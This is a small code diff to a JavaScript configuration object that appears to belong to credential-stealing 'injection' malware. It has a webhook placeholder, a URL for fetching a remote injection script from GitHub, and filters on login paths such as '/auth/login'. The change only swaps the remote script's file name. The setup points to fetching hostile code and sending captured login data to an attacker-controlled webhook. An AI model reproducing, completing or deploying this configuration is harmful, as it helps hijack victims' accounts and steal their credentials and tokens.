@@ -11,7 +11,7 @@ const CONFIG = {
   webhook:
     "%WEBHOOK%",
   injection_url:
-    "https://github.com/Vrjdg/injection/raw/refs/heads/main/injection.js",
+    "https://github.com/Vrjdg/injection/raw/refs/heads/main/index.js",
   filters: {
     urls: [
       "/auth/login",
